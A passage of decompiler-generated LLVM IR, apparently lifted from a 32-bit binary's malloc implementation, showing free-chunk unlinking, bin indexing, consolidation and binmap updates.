  store i32 %v0_80533c4, i32* %eax.global-to-local, align 4
  %v3_80533c9 = and i8 %v0_8053336, 2
  %v4_80533c9 = icmp eq i8 %v3_80533c9, 0
  br i1 %v4_80533c9, label %dec_label_pc_80534bc.preheader, label %dec_label_pc_80533d6

dec_label_pc_80533d6:                             ; preds = %dec_label_pc_80533c0
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* %stack_var_-92, align 4
  %v2_80533de = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061860.494 to i32*))
  store i32 %v2_80533de, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80534bc.preheader

dec_label_pc_80534bc.preheader:                   ; preds = %dec_label_pc_80533d6, %dec_label_pc_8053389, %dec_label_pc_80533c0
  %stack_var_-40.0.ph = phi i32 [ %v2_805338d, %dec_label_pc_8053389 ], [ %v0_80533c4, %dec_label_pc_80533d6 ], [ %v0_80533c4, %dec_label_pc_80533c0 ]
  %v1_8053412 = add i32 %v1_80536d6, 16
  %v0_80534bc109 = load i32, i32* @global_var_80618a0.498, align 32
  store i32 %v0_80534bc109, i32* @ebp, align 4
  %v9_80534c2115 = icmp eq i32 %v0_80534bc109, 134617236
  %v1_80534c8117 = icmp eq i1 %v9_80534c2115, false
  br i1 %v1_80534c8117, label %dec_label_pc_80533eb, label %dec_label_pc_80534ce

dec_label_pc_80533eb:                             ; preds = %dec_label_pc_80534bc.preheader, %bb82
  %v0_80534bc118 = phi i32 [ %v0_80534bc, %bb82 ], [ %v0_80534bc109, %dec_label_pc_80534bc.preheader ]
  %v1_80533eb = add i32 %v0_80534bc118, 4
  %v2_80533eb = inttoptr i32 %v1_80533eb to i32*
  %v3_80533eb = load i32, i32* %v2_80533eb, align 4
  %v1_80533ee = add i32 %v0_80534bc118, 12
  %v2_80533ee = inttoptr i32 %v1_80533ee to i32*
  %v3_80533ee = load i32, i32* %v2_80533ee, align 4
  store i32 %v3_80533ee, i32* @edx, align 4
  %v1_80533f1 = and i32 %v3_80533eb, -4
  store i32 %v1_80533f1, i32* @edi, align 4
  br i1 %v6_8053387, label %dec_label_pc_805341d, label %dec_label_pc_80533fe

dec_label_pc_80533fe:                             ; preds = %dec_label_pc_80533eb
  %v9_80533fe = icmp eq i32 %v3_80533ee, 134617236
  %v1_8053404 = icmp eq i1 %v9_80533fe, false
  br i1 %v1_8053404, label %dec_label_pc_805341d, label %dec_label_pc_8053406

dec_label_pc_8053406:                             ; preds = %dec_label_pc_80533fe
  %v1_8053406 = load i32, i32* @global_var_8061890.496, align 16
  %v12_8053406 = icmp eq i32 %v0_80534bc118, %v1_8053406
  %v1_805340c = icmp eq i1 %v12_8053406, false
  br i1 %v1_805340c, label %dec_label_pc_805341d, label %dec_label_pc_805340e

dec_label_pc_805340e:                             ; preds = %dec_label_pc_8053406
  store i32 %v1_8053412, i32* %eax.global-to-local, align 4
  %v6_8053417 = icmp ugt i32 %v1_80533f1, %v1_8053412
  br i1 %v6_8053417, label %dec_label_pc_80539fc, label %dec_label_pc_805341d

dec_label_pc_805341d:                             ; preds = %dec_label_pc_805340e, %dec_label_pc_8053406, %dec_label_pc_80533fe, %dec_label_pc_80533eb
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_80533ee, i32* @global_var_80618a0.498, align 4
  %v2_8053425 = add i32 %v3_80533ee, 8
  %v3_8053425 = inttoptr i32 %v2_8053425 to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v3_8053425, align 4
  %v0_8053428 = load i32, i32* @edi, align 4
  %v15_8053428 = icmp eq i32 %v0_8053428, %v1_80536d6
  br i1 %v15_8053428, label %dec_label_pc_8053a3d, label %dec_label_pc_8053432

dec_label_pc_8053432:                             ; preds = %dec_label_pc_805341d
  %v6_8053438 = icmp ugt i32 %v0_8053428, 255
  br i1 %v6_8053438, label %dec_label_pc_805344b, label %dec_label_pc_805343a

dec_label_pc_805343a:                             ; preds = %dec_label_pc_8053432
  %v2_805343c = udiv i32 %v0_8053428, 8
  store i32 %v2_805343c, i32* %esi.global-to-local, align 4
  %v1_805343f = mul nuw i32 %v2_805343c, 8
  %v2_805343f = add i32 %v1_805343f, 134617228
  store i32 %v2_805343f, i32* @ebx, align 4
  %v1_8053446 = add i32 %v1_805343f, 134617236
  %v2_8053446 = inttoptr i32 %v1_8053446 to i32*
  %v3_8053446 = load i32, i32* %v2_8053446, align 4
  store i32 %v3_8053446, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053494

dec_label_pc_805344b:                             ; preds = %dec_label_pc_8053432
  store i32 %v0_8053428, i32* @eax, align 4
  %v0_805344d = call i32 @__malloc_largebin_index()
  store i32 %v0_805344d, i32* %esi.global-to-local, align 4
  %v1_8053454 = mul i32 %v0_805344d, 8
  %v2_8053454 = add i32 %v1_8053454, ptrtoint (i32* @global_var_806188c.495 to i32)
  store i32 %v2_8053454, i32* %eax.global-to-local, align 4
  %v1_805345b = add i32 %v1_8053454, add (i32 ptrtoint (i32* @global_var_806188c.495 to i32), i32 8)
  %v2_805345b = inttoptr i32 %v1_805345b to i32*
  %v3_805345b = load i32, i32* %v2_805345b, align 4
  store i32 %v3_805345b, i32* %edx.global-to-local, align 4
  %v12_805345e = icmp eq i32 %v3_805345b, %v2_8053454
  store i32 %v3_805345b, i32* @ebx, align 4
  br i1 %v12_805345e, label %dec_label_pc_8053494, label %dec_label_pc_8053468

dec_label_pc_8053468:                             ; preds = %dec_label_pc_805344b
  %v1_8053468 = add i32 %v1_8053454, add (i32 ptrtoint (i32* @global_var_806188c.495 to i32), i32 12)
  %v2_8053468 = inttoptr i32 %v1_8053468 to i32*
  %v3_8053468 = load i32, i32* %v2_8053468, align 4
  store i32 %v3_8053468, i32* @ebx, align 4
  %v0_805346b = load i32, i32* @edi, align 4
  %v2_805346b = add i32 %v3_8053468, 4
  %v3_805346b = inttoptr i32 %v2_805346b to i32*
  %v4_805346b = load i32, i32* %v3_805346b, align 4
  %v10_805346b = icmp ult i32 %v0_805346b, %v4_805346b
  %v1_805346e = icmp eq i1 %v10_805346b, false
  br i1 %v1_805346e, label %dec_label_pc_8053476, label %dec_label_pc_8053494

dec_label_pc_8053476:                             ; preds = %dec_label_pc_8053468
  %v1_8053478 = or i32 %v0_805346b, 1
  store i32 %v1_8053478, i32* %eax.global-to-local, align 4
  store i32 %v3_805345b, i32* %ebx.global-to-local, align 4
  %v2_805348c101 = add i32 %v3_805345b, 4
  %v3_805348c102 = inttoptr i32 %v2_805348c101 to i32*
  %v4_805348c103 = load i32, i32* %v3_805348c102, align 4
  %v10_805348c105 = icmp ult i32 %v1_8053478, %v4_805348c103
  br i1 %v10_805348c105, label %dec_label_pc_805347d, label %dec_label_pc_8053491

dec_label_pc_805347d:                             ; preds = %dec_label_pc_8053476, %dec_label_pc_805347d
  %v0_8053491106 = phi i32 [ %v3_8053481, %dec_label_pc_805347d ], [ %v3_805345b, %dec_label_pc_8053476 ]
  store i32 %v0_8053491106, i32* %ecx.global-to-local, align 4
  %v1_8053481 = add i32 %v0_8053491106, 8
  %v2_8053481 = inttoptr i32 %v1_8053481 to i32*
  %v3_8053481 = load i32, i32* %v2_8053481, align 4
  store i32 %v3_8053481, i32* %ecx.global-to-local, align 4
  store i32 %v3_8053481, i32* %ebx.global-to-local, align 4
  %v2_805348c = add i32 %v3_8053481, 4
  %v3_805348c = inttoptr i32 %v2_805348c to i32*
  %v4_805348c = load i32, i32* %v3_805348c, align 4
  %v10_805348c = icmp ult i32 %v1_8053478, %v4_805348c
  br i1 %v10_805348c, label %dec_label_pc_805347d, label %dec_label_pc_8053491

dec_label_pc_8053491:                             ; preds = %dec_label_pc_805347d, %dec_label_pc_8053476
  %v0_8053491.lcssa = phi i32 [ %v3_805345b, %dec_label_pc_8053476 ], [ %v3_8053481, %dec_label_pc_805347d ]
  %v1_8053491 = add i32 %v0_8053491.lcssa, 12
  %v2_8053491 = inttoptr i32 %v1_8053491 to i32*
  %v3_8053491 = load i32, i32* %v2_8053491, align 4
  store i32 %v3_8053491, i32* @ebx, align 4
  br label %dec_label_pc_8053494

dec_label_pc_8053494:                             ; preds = %dec_label_pc_805343a, %dec_label_pc_8053468, %dec_label_pc_805344b, %dec_label_pc_8053491
  %v0_8053494 = phi i32 [ %v0_805344d, %dec_label_pc_805344b ], [ %v0_805344d, %dec_label_pc_8053491 ], [ %v0_805344d, %dec_label_pc_8053468 ], [ %v2_805343c, %dec_label_pc_805343a ]
  %stack_var_-64.1 = phi i32 [ %v3_805345b, %dec_label_pc_805344b ], [ %v0_8053491.lcssa, %dec_label_pc_8053491 ], [ %v2_8053454, %dec_label_pc_8053468 ], [ %v3_8053446, %dec_label_pc_805343a ]
  %v1_8053496 = urem i32 %v0_8053494, 32
  %v2_8053496 = icmp eq i32 %v1_8053496, 0
  store i32 %v1_8053496, i32* %esi.global-to-local, align 4
  store i32 %v1_8053496, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80534a0 = sdiv i32 %v0_8053494, 32
  store i32 %v2_80534a0, i32* %edx.global-to-local, align 4
  br i1 %v2_8053496, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_8053494
  %v5_80534a3 = shl i32 1, %v1_8053496
  store i32 %v5_80534a3, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_8053494, %bb
  %v5_80534a5 = phi i32 [ 1, %dec_label_pc_8053494 ], [ %v5_80534a3, %bb ]
  %v1_80534a5 = mul nsw i32 %v2_80534a0, 4
  %v2_80534a5 = add i32 %v1_80534a5, ptrtoint (i32* @global_var_8061b94.499 to i32)
  %v3_80534a5 = inttoptr i32 %v2_80534a5 to i32*
  %v4_80534a5 = load i32, i32* %v3_80534a5, align 4
  %v6_80534a5 = or i32 %v4_80534a5, %v5_80534a5
  store i32 %v6_80534a5, i32* %v3_80534a5, align 4
  %v0_80534ac = load i32, i32* @ebx, align 4
  %v1_80534ac = load i32, i32* @ebp, align 4
  %v2_80534ac = add i32 %v1_80534ac, 12
  %v3_80534ac = inttoptr i32 %v2_80534ac to i32*
  store i32 %v0_80534ac, i32* %v3_80534ac, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_80534b3 = load i32, i32* @ebp, align 4
  %v2_80534b3 = add i32 %v1_80534b3, 8
  %v3_80534b3 = inttoptr i32 %v2_80534b3 to i32*
  store i32 %stack_var_-64.1, i32* %v3_80534b3, align 4
  %v0_80534b6 = load i32, i32* @ebp, align 4
  %v1_80534b6 = load i32, i32* @esi, align 4
  %v2_80534b6 = add i32 %v1_80534b6, 12
  %v3_80534b6 = inttoptr i32 %v2_80534b6 to i32*
  store i32 %v0_80534b6, i32* %v3_80534b6, align 4
  %v0_80534b9 = load i32, i32* @ebp, align 4
  %v1_80534b9 = load i32, i32* @ebx, align 4
  %v2_80534b9 = add i32 %v1_80534b9, 8
  %v3_80534b9 = inttoptr i32 %v2_80534b9 to i32*
  store i32 %v0_80534b9, i32* %v3_80534b9, align 4
  %v0_80534bc = load i32, i32* @global_var_80618a0.498, align 32
  store i32 %v0_80534bc, i32* @ebp, align 4
  %v9_80534c2 = icmp eq i32 %v0_80534bc, 134617236
  %v1_80534c8 = icmp eq i1 %v9_80534c2, false
  br i1 %v1_80534c8, label %dec_label_pc_80533eb, label %dec_label_pc_80534ce

dec_label_pc_80534ce:                             ; preds = %bb82, %dec_label_pc_80534bc.preheader
  br i1 %v8_805337f, label %dec_label_pc_805355c, label %dec_label_pc_80534dc

dec_label_pc_80534dc:                             ; preds = %dec_label_pc_80534ce
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_80534e0 = mul i32 %stack_var_-40.0.ph, 8
  %v2_80534e0 = add i32 %v1_80534e0, ptrtoint (i32* @global_var_806188c.495 to i32)
  store i32 %v2_80534e0, i32* %edx.global-to-local, align 4
  %v1_80534e7 = add i32 %v1_80534e0, add (i32 ptrtoint (i32* @global_var_806188c.495 to i32), i32 12)
  %v2_80534e7 = inttoptr i32 %v1_80534e7 to i32*
  %storemerge1.pre = load i32, i32* %v2_80534e7, align 4
  br label %dec_label_pc_8053558

dec_label_pc_80534ec:                             ; preds = %dec_label_pc_8053558
  %v1_80534ec = add i32 %v4_8053503, 4
  %v2_80534ec = inttoptr i32 %v1_80534ec to i32*
  %v3_80534ec = load i32, i32* %v2_80534ec, align 4
  store i32 %v3_80534ec, i32* %ebx.global-to-local, align 4
  %v1_80534ef = add i32 %v4_8053503, 12
  %v2_80534ef = inttoptr i32 %v1_80534ef to i32*
  %v3_80534ef = load i32, i32* %v2_80534ef, align 4
  store i32 %v3_80534ef, i32* @ecx, align 4
  %v1_80534f2 = and i32 %v3_80534ec, -4
  store i32 %v1_80534f2, i32* @ebx, align 4
  %v10_80534f5 = icmp ult i32 %v1_80534f2, %v1_80536d6
  br i1 %v10_80534f5, label %dec_label_pc_8053558, label %dec_label_pc_80534fb

dec_label_pc_80534fb:                             ; preds = %dec_label_pc_80534ec
  %v1_80534fb = add i32 %v4_8053503, 8
  %v2_80534fb = inttoptr i32 %v1_80534fb to i32*
  %v3_80534fb = load i32, i32* %v2_80534fb, align 4
  store i32 %v3_80534fb, i32* @edx, align 4
  %v1_80534fe = add i32 %v3_80534fb, 12
  %v2_80534fe = inttoptr i32 %v1_80534fe to i32*
  %v3_80534fe = load i32, i32* %v2_80534fe, align 4
  %v15_80534fe = icmp eq i32 %v3_80534fe, %v4_8053503
  %v1_8053501 = icmp eq i1 %v15_80534fe, false
  br i1 %v1_8053501, label %dec_label_pc_8053508, label %dec_label_pc_8053503

dec_label_pc_8053503:                             ; preds = %dec_label_pc_80534fb
  %v1_8053503 = add i32 %v3_80534ef, 8
  %v2_8053503 = inttoptr i32 %v1_8053503 to i32*
  %v3_8053503 = load i32, i32* %v2_8053503, align 4
  %v15_8053503 = icmp eq i32 %v3_8053503, %v4_8053503
  br i1 %v15_8053503, label %dec_label_pc_805350d, label %dec_label_pc_8053508

dec_label_pc_8053508:                             ; preds = %dec_label_pc_8053503, %dec_label_pc_80534fb
  %v0_8053508 = call i32 @abort()
  store i32 %v0_8053508, i32* %eax.global-to-local, align 4
  %v0_805350d.pre = load i32, i32* @ebx, align 4
  %v0_8053513.pre = load i32, i32* @ecx, align 4
  %v1_8053513.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805350d

dec_label_pc_805350d:                             ; preds = %dec_label_pc_8053503, %dec_label_pc_8053508
  %v1_8053513 = phi i32 [ %v3_80534fb, %dec_label_pc_8053503 ], [ %v1_8053513.pre, %dec_label_pc_8053508 ]
  %v0_8053513 = phi i32 [ %v3_80534ef, %dec_label_pc_8053503 ], [ %v0_8053513.pre, %dec_label_pc_8053508 ]
  %v0_805350d = phi i32 [ %v1_80534f2, %dec_label_pc_8053503 ], [ %v0_805350d.pre, %dec_label_pc_8053508 ]
  %v5_805350f = sub i32 %v0_805350d, %v1_80536d6
  store i32 %v5_805350f, i32* %esi.global-to-local, align 4
  %v2_8053513 = add i32 %v1_8053513, 12
  %v3_8053513 = inttoptr i32 %v2_8053513 to i32*
  store i32 %v0_8053513, i32* %v3_8053513, align 4
  %v0_8053516 = load i32, i32* @edx, align 4
  %v1_8053516 = load i32, i32* @ecx, align 4
  %v2_8053516 = add i32 %v1_8053516, 8
  %v3_8053516 = inttoptr i32 %v2_8053516 to i32*
  store i32 %v0_8053516, i32* %v3_8053516, align 4
  %v0_8053519 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053519 = add i32 %v0_8053519, 8
  store i32 %v1_8053519, i32* @ecx, align 4
  %v0_805351c = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_805351c, 16
  br i1 %tmp137, label %dec_label_pc_8053a4b, label %dec_label_pc_8053525

dec_label_pc_8053525:                             ; preds = %dec_label_pc_805350d
  %v2_8053529 = add i32 %v0_8053519, %v1_80536d6
  store i32 %v2_8053529, i32* @edx, align 4
  %v1_805352c = or i32 %v1_80536d6, 1
  store i32 %v1_805352c, i32* %ebx.global-to-local, align 4
  %v2_805352f = add i32 %v0_8053519, 4
  %v3_805352f = inttoptr i32 %v2_805352f to i32*
  store i32 %v1_805352c, i32* %v3_805352f, align 4
  %v0_8053532 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053534 = or i32 %v0_8053532, 1
  store i32 %v1_8053534, i32* %eax.global-to-local, align 4
  %v0_8053537 = load i32, i32* @edx, align 4
  %v1_8053537 = load i32, i32* @ebp, align 4
  %v2_8053537 = add i32 %v1_8053537, 8
  %v3_8053537 = inttoptr i32 %v2_8053537 to i32*
  store i32 %v0_8053537, i32* %v3_8053537, align 4
  %v0_805353a = load i32, i32* @edx, align 4
  %v1_805353a = load i32, i32* @ebp, align 4
  %v2_805353a = add i32 %v1_805353a, 12
  %v3_805353a = inttoptr i32 %v2_805353a to i32*
  store i32 %v0_805353a, i32* %v3_805353a, align 4
  %v0_805353d = load i32, i32* @edx, align 4
  %v1_805353d = add i32 %v0_805353d, 8
  %v2_805353d = inttoptr i32 %v1_805353d to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_805353d, align 4
  %v0_8053544 = load i32, i32* @edx, align 4
  %v1_8053544 = add i32 %v0_8053544, 12
  %v2_8053544 = inttoptr i32 %v1_8053544 to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_8053544, align 4
  %v0_805354b = load i32, i32* %eax.global-to-local, align 4
  %v1_805354b = load i32, i32* @edx, align 4
  %v2_805354b = add i32 %v1_805354b, 4
  %v3_805354b = inttoptr i32 %v2_805354b to i32*
  store i32 %v0_805354b, i32* %v3_805354b, align 4
  %v0_805354e = load i32, i32* %esi.global-to-local, align 4
  %v1_805354e = load i32, i32* @edx, align 4
  %v3_805354e = add i32 %v1_805354e, %v0_805354e
  %v4_805354e = inttoptr i32 %v3_805354e to i32*
  store i32 %v0_805354e, i32* %v4_805354e, align 4
  br label %dec_label_pc_8053a50

dec_label_pc_8053558:                             ; preds = %dec_label_pc_80534ec, %dec_label_pc_80534dc
  %v4_8053503 = phi i32 [ %storemerge1.pre, %dec_label_pc_80534dc ], [ %v3_80534ef, %dec_label_pc_80534ec ]
  store i32 %v4_8053503, i32* %eax.global-to-local, align 4
  %v12_8053558 = icmp eq i32 %v4_8053503, %v2_80534e0
  %v1_805355a = icmp eq i1 %v12_8053558, false
  br i1 %v1_805355a, label %dec_label_pc_80534ec, label %dec_label_pc_805355c.loopexit

dec_label_pc_805355c.loopexit:                    ; preds = %dec_label_pc_8053558
  br label %dec_label_pc_805355c

dec_label_pc_805355c:                             ; preds = %dec_label_pc_805355c.loopexit, %dec_label_pc_80534ce
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8053565 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_8053565, i32* %ecx.global-to-local, align 4
  %v2_8053568 = udiv i32 %v1_8053565, 32
  store i32 %v2_8053568, i32* @edi, align 4
  %v1_805356b = mul nuw nsw i32 %v2_8053568, 4
  %v2_805356b = add i32 %v1_805356b, ptrtoint (i32* @global_var_8061b94.499 to i32)
  %v3_805356b = inttoptr i32 %v2_805356b to i32*
  %v4_805356b = load i32, i32* %v3_805356b, align 4
  store i32 %v4_805356b, i32* %edx.global-to-local, align 4
  %v1_8053572 = mul i32 %v1_8053565, 8
  %v2_8053572 = add i32 %v1_8053572, ptrtoint (i32* @global_var_806188c.495 to i32)
  store i32 %v2_8053572, i32* %ebx.global-to-local, align 4
  %v1_8053579 = urem i32 %v1_8053565, 32
  %v2_8053579 = icmp eq i32 %v1_8053579, 0
  store i32 %v1_8053579, i32* %ecx.global-to-local, align 4
  br i1 %v2_8053579, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_805355c
  %v5_805357c = shl i32 1, %v1_8053579
  store i32 %v5_805357c, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_805355c, %bb83, %dec_label_pc_80535bd
  %v1_805357e = phi i32 [ %v1_805357e.pre, %dec_label_pc_80535bd ], [ %v4_805356b, %bb83 ], [ %v4_805356b, %dec_label_pc_805355c ]
  %v0_8053582 = phi i32 [ %v0_805357e.pre, %dec_label_pc_80535bd ], [ %v5_805357c, %bb83 ], [ 1, %dec_label_pc_805355c ]
  %tmp84 = icmp ule i32 %v0_8053582, %v1_805357e
  %v1_8053582 = icmp eq i32 %v0_8053582, 0
  %v1_8053584 = icmp eq i1 %v1_8053582, false
  %or.cond = and i1 %tmp84, %v1_8053584
  br i1 %or.cond, label %dec_label_pc_8053582.dec_label_pc_80535b2.preheader_crit_edge, label %dec_label_pc_8053586.preheader

dec_label_pc_8053582.dec_label_pc_80535b2.preheader_crit_edge: ; preds = %.preheader
  %v0_80535ad12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80535b2.preheader

dec_label_pc_8053586.preheader:                   ; preds = %.preheader
  %v0_8053586.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053586

dec_label_pc_8053586:                             ; preds = %dec_label_pc_8053586.preheader, %dec_label_pc_8053590
  %v0_8053586 = phi i32 [ %v0_8053586.pre, %dec_label_pc_8053586.preheader ], [ %v1_8053586, %dec_label_pc_8053590 ]
  %v1_8053586 = add i32 %v0_8053586, 1
  store i32 %v1_8053586, i32* @edi, align 4
  %v6_805358a = icmp ugt i32 %v1_8053586, 2
  br i1 %v6_805358a, label %dec_label_pc_8053641.loopexit, label %dec_label_pc_8053590

dec_label_pc_8053590:                             ; preds = %dec_label_pc_8053586
  %v1_8053590 = mul i32 %v1_8053586, 4
  %v2_8053590 = add i32 %v1_8053590, ptrtoint (i32* @global_var_8061b94.499 to i32)
  %v3_8053590 = inttoptr i32 %v2_8053590 to i32*
  %v4_8053590 = load i32, i32* %v3_8053590, align 4
  store i32 %v4_8053590, i32* %edx.global-to-local, align 4
  %v1_8053597 = icmp eq i32 %v4_8053590, 0
  br i1 %v1_8053597, label %dec_label_pc_8053586, label %dec_label_pc_805359b

dec_label_pc_805359b:                             ; preds = %dec_label_pc_8053590
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80535a2 = mul i32 %v1_8053586, 256
  store i32 %v2_80535a2, i32* %eax.global-to-local, align 4
  %v1_80535a5 = add i32 %v2_80535a2, ptrtoint (i32* @global_var_806188c.495 to i32)
  store i32 %v1_80535a5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80535b2.preheader

dec_label_pc_80535b2.preheader:                   ; preds = %dec_label_pc_8053582.dec_label_pc_80535b2.preheader_crit_edge, %dec_label_pc_805359b
  %v0_80535ad12 = phi i32 [ %v1_80535a5, %dec_label_pc_805359b ], [ %v0_80535ad12.pre, %dec_label_pc_8053582.dec_label_pc_80535b2.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_805359b ], [ %v0_8053582, %dec_label_pc_8053582.dec_label_pc_80535b2.preheader_crit_edge ]
  %v0_80535c3 = phi i32 [ %v4_8053590, %dec_label_pc_805359b ], [ %v1_805357e, %dec_label_pc_8053582.dec_label_pc_80535b2.preheader_crit_edge ]
  %v2_80535b24 = and i32 %v0_80535c3, %esi.promoted
  %v3_80535b25 = icmp eq i32 %v2_80535b24, 0
  br i1 %v3_80535b25, label %dec_label_pc_80535ad, label %dec_label_pc_80535b6

dec_label_pc_80535ad:                             ; preds = %dec_label_pc_80535b2.preheader, %dec_label_pc_80535ad
  %v2_80535b014 = phi i32 [ %v2_80535b0, %dec_label_pc_80535ad ], [ %esi.promoted, %dec_label_pc_80535b2.preheader ]
  %v0_80535ad13 = phi i32 [ %v1_80535ad, %dec_label_pc_80535ad ], [ %v0_80535ad12, %dec_label_pc_80535b2.preheader ]
  %v1_80535ad = add i32 %v0_80535ad13, 8
  %v2_80535b0 = mul i32 %v2_80535b014, 2
  %v2_80535b2 = and i32 %v2_80535b0, %v0_80535c3
  %v3_80535b2 = icmp eq i32 %v2_80535b2, 0
  br i1 %v3_80535b2, label %dec_label_pc_80535ad, label %dec_label_pc_80535b2.dec_label_pc_80535b6_crit_edge

dec_label_pc_80535b2.dec_label_pc_80535b6_crit_edge: ; preds = %dec_label_pc_80535ad
  store i32 %v1_80535ad, i32* %ebx.global-to-local, align 4
  store i32 %v2_80535b0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80535b6

dec_label_pc_80535b6:                             ; preds = %dec_label_pc_80535b2.dec_label_pc_80535b6_crit_edge, %dec_label_pc_80535b2.preheader
  %v0_80535bd = phi i32 [ %v2_80535b0, %dec_label_pc_80535b2.dec_label_pc_80535b6_crit_edge ], [ %esi.promoted, %dec_label_pc_80535b2.preheader ]
  %v1_80535e0 = phi i32 [ %v1_80535ad, %dec_label_pc_80535b2.dec_label_pc_80535b6_crit_edge ], [ %v0_80535ad12, %dec_label_pc_80535b2.preheader ]
  %v1_80535b6 = add i32 %v1_80535e0, 12
  %v2_80535b6 = inttoptr i32 %v1_80535b6 to i32*
  %v3_80535b6 = load i32, i32* %v2_80535b6, align 4
  store i32 %v3_80535b6, i32* @ecx, align 4
  %v12_80535b9 = icmp eq i32 %v3_80535b6, %v1_80535e0
  %v1_80535bb = icmp eq i1 %v12_80535b9, false
  br i1 %v1_80535bb, label %dec_label_pc_80535d1, label %dec_label_pc_80535bd

dec_label_pc_80535bd:                             ; preds = %dec_label_pc_80535b6
  %v2_80535bf = mul i32 %v0_80535bd, 2
  store i32 %v2_80535bf, i32* %esi.global-to-local, align 4
  %v1_80535c1 = sub i32 -1, %v0_80535bd
  store i32 %v1_80535c1, i32* %eax.global-to-local, align 4
  %v2_80535c3 = and i32 %v0_80535c3, %v1_80535c1
  store i32 %v2_80535c3, i32* %edx.global-to-local, align 4
  %v1_80535c5 = add i32 %v3_80535b6, 8
  store i32 %v1_80535c5, i32* %ebx.global-to-local, align 4
  %v1_80535c8 = load i32, i32* @edi, align 4
  %v2_80535c8 = mul i32 %v1_80535c8, 4
  %v3_80535c8 = add i32 %v2_80535c8, ptrtoint (i32* @global_var_8061b94.499 to i32)
  %v4_80535c8 = inttoptr i32 %v3_80535c8 to i32*
  store i32 %v2_80535c3, i32* %v4_80535c8, align 4
  %v0_805357e.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805357e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_80535d1:                             ; preds = %dec_label_pc_80535b6
  %v1_80535d1 = add i32 %v3_80535b6, 4
  %v2_80535d1 = inttoptr i32 %v1_80535d1 to i32*
  %v3_80535d1 = load i32, i32* %v2_80535d1, align 4
  store i32 %v3_80535d1, i32* %edx.global-to-local, align 4
  %v1_80535d4 = add i32 %v3_80535b6, 12
  %v2_80535d4 = inttoptr i32 %v1_80535d4 to i32*
  %v3_80535d4 = load i32, i32* %v2_80535d4, align 4
  store i32 %v3_80535d4, i32* %eax.global-to-local, align 4
  %v1_80535d7 = and i32 %v3_80535d1, -4
  store i32 %v1_80535d7, i32* @edx, align 4
  %v5_80535dc = sub i32 %v1_80535d7, %v1_80536d6
  store i32 %v5_80535dc, i32* %esi.global-to-local, align 4
  store i32 %v3_80535d4, i32* %v2_80535b6, align 4
  %v0_80535e3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80535e3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80535e3 = add i32 %v1_80535e3, 8
  %v3_80535e3 = inttoptr i32 %v2_80535e3 to i32*
  store i32 %v0_80535e3, i32* %v3_80535e3, align 4
  %v0_80535e6 = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_80535e6, 16
  %v0_80535eb = load i32, i32* @ecx, align 4
  br i1 %tmp138, label %dec_label_pc_80535eb, label %dec_label_pc_80535f2

dec_label_pc_80535eb:                             ; preds = %dec_label_pc_80535d1
  %v1_80535eb = load i32, i32* @edx, align 4
  %v2_80535eb = add i32 %v0_80535eb, 4
  %v3_80535eb = add i32 %v2_80535eb, %v1_80535eb
  %v4_80535eb = inttoptr i32 %v3_80535eb to i32*
  %v5_80535eb = load i32, i32* %v4_80535eb, align 4
  %v6_80535eb = or i32 %v5_80535eb, 1
  store i32 %v6_80535eb, i32* %v4_80535eb, align 4
  br label %dec_label_pc_8053639

dec_label_pc_80535f2:                             ; preds = %dec_label_pc_80535d1
  %v2_80535f6 = add i32 %v0_80535eb, %v1_80536d6
  store i32 %v2_80535f6, i32* %eax.global-to-local, align 4
  %v1_80535ff = load i32, i32* @ebp, align 4
  %v2_80535ff = add i32 %v1_80535ff, 8
  %v3_80535ff = inttoptr i32 %v2_80535ff to i32*
  store i32 %v2_80535f6, i32* %v3_80535ff, align 4
  %v0_8053602 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053602 = load i32, i32* @ebp, align 4
  %v2_8053602 = add i32 %v1_8053602, 12
  %v3_8053602 = inttoptr i32 %v2_8053602 to i32*
  store i32 %v0_8053602, i32* %v3_8053602, align 4
  %v0_8053605 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053605 = add i32 %v0_8053605, 8
  %v2_8053605 = inttoptr i32 %v1_8053605 to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_8053605, align 4
  %v0_805360c = load i32, i32* %eax.global-to-local, align 4
  %v1_805360c = add i32 %v0_805360c, 12
  %v2_805360c = inttoptr i32 %v1_805360c to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_805360c, align 4
  %v0_8053613 = load i32, i32* @global_var_8061890.496, align 16
  %v4_8053619 = load i32, i32* %eax.global-to-local, align 4
